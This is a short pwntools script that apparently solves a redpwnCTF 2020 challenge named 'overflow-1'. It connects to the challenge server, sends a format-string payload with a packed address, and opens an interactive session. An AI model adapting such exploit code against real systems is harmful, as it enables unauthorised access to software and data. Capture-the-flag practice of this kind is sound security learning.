from pwn import*

# io=process('./overflow-1')
io=remote("2020.redpwnc.tf",31826)
payload='%7$s'+p64(0x944)
io.recvuntil("young adventurer?")
io.sendline(payload)
io.interactive()